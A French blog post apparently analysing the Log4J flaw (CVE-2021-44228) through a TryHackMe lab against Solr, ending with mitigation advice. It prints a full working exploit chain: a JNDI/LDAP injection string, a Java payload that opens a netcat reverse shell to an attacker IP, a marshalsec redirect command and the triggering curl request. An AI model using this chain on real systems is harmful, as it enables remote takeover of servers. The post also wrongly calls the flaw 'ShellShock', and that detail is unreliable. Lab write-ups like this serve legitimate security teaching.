---

layout: post

title: "Analyse de la faille Log4J"

date: 2021-12-13

categories: divers

---

# Diclaimer

# Analyse de la faille Log4J (CVE-2021-44228)

Pas besoin d'être un professionnel de la cybersécurité pour avoir entendu parler de cette faille qui a mis les internet en ébullition ces derniers jours.

Connue sous le nom de CVE-2021-44228, ou plus communément "ShellShock" de par son impact étendu, cette faille notée 10 (sur 10 !) par le scoring CVSS permet un _Remote Code Execution_ en exploitant le système de log basé sur Java : Log4J.

Je vous propose une brève analyse de cette faille. Avec tout d'abord un remerciement à John Hammond pour la création de la machine vulnérable sur TryHackMe.

Voici un bref récapitulatif de l'attaque : 

![draw (1)](https://user-images.githubusercontent.com/16634117/145877226-310dc164-e164-4cbb-9065-1027ad80f0d2.jpg)


# Reconnaissance de la faille

Cette faille se retrouve sur bon nombre d'applications, puisque Log4J est très répandue pour la création de logs. Pour cette attaque, je me base sur l'application Solr, qui utilise une version vulnérable de Log4J.

![2](https://user-images.githubusercontent.com/16634117/145869688-87433bd9-c133-41de-bd0d-43588d5e01a1.PNG)

Un petit tour sur l'application et on remarque rapidement que l'application Log4J est présente dans les arguments de l'application. 

Il faut maintenant savoir si cette version est vulnérable, pour ça, il faut trouver un point d'injection. Le plus simple est de jeter un oeil aux logs de l'application :

![example_logs](https://user-images.githubusercontent.com/16634117/145869966-14f8f7bf-995c-470a-a6e8-dc4a334a5edb.png)

Ici, on voit clairement que les requêtes GET sont journalisées ; l'url, mais également **les paramètres**. (C'est sur ce point que l'exploit peut changer, suivant la journalisation en place, il existera des points d'injection de code ou pas.)

Pour identifier la vulnérabilité du système, j'injecte un paramètres GET avec la charge utile suivante (expliquée dans la présentation de la faille) :

`{jndi:ldap://<IP>:<PORT>}`

![5](https://user-images.githubusercontent.com/16634117/145870531-750a9523-9d1c-4b0d-b523-af4b2d1e669e.png)
_L'injection, avec un listener pour récupérer la connexion, permettant de vérifier la bonne exécution de la charge utile_

Une connexion s'effectue bien entre notre machine et le serveur, ce dernier est donc **vulnérable à l'attaque**.

# Exploitation

Nous avons vu dans la partie précédente que l'application est vulnérable, pour le moment, aucune execution de code sur le serveur n'est réalisée. 

C'est ici que la seconde partie de la faille se trouve, l'utilisation de [JNDI](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) va permettre de faire des appels à un serveur LDAP, serveur qui peut être malicieux et donc utilisé pour rediriger vers du code malveillant en notre possession.

## Charge utile

Afin de créer un accès au serveur, on cherche simplement à créer un shell, pour ça la classe Java suivante est suffisante : 

```Java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.65.176 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

On la compile sous le nom de `Exploit.class`

## Mise en place d'un serveur LDAP malveillant

Pour cela on utilise le software [Marshalsec](https://github.com/mbechler/marshalsec) qui va permettre de créer le serveur LDAP et de rediriger le trafic.

La commande suivante va créer le serveur et rediriger vers notre code malveillant :

`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.65.176:8000/#Exploit"`

![image](https://user-images.githubusercontent.com/16634117/145871850-2f83e1d5-6e94-40ec-803b-c71be8fca4d6.png)

## Attaque

Une fois les éléments en place, il faut unserveur capable de répondre avec notre charge malveillante, un simple `python3 -m http.server` à la racine de notre paylaod fera l'affaire.

Pour pouvoir récupérer le shell il faut également ouvrir une connexion au niveau de la machine d'attaque :

`nc -lnvp 9999`

Tous les éléments sont en place. 

Une requête avec l'injection va permettre de déclencher toute la chaîne d'attaque : 

`curl 'http://10.10.31.65:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.65.176:1389/Exploit\}'`

Une fois cela fait :

![image](https://user-images.githubusercontent.com/16634117/145872643-ec39c7ca-e33d-4b34-8c31-a6b2ed397b09.png)
_De haut en bas et de gauche à droite : la reqûete malveillante, le serveur LDAP redirigeant le traffic, le serveur Python répondant avec la payload RCE compilée, le reverse shell_

On obtient bien un accès en shell au serveur, par la suite il est possible de continuer une chaîne classique d'attaque pour gagner en privilèges et corrompre une plus grande partie du système.

# Conclusion et réponse

Cette faille touche un grand nombre de système, et il y a de fortes chances que vos systèmes en fassent partie, pour vous les solutions sont les suivantes : 

* Mettre à jour Log4J,
* Désactiver le lookup JDNI.

Une liste non exhaustive des applications touchées est disponible ici : https://github.com/NCSC-NL/log4shell/blob/main/software/README.md



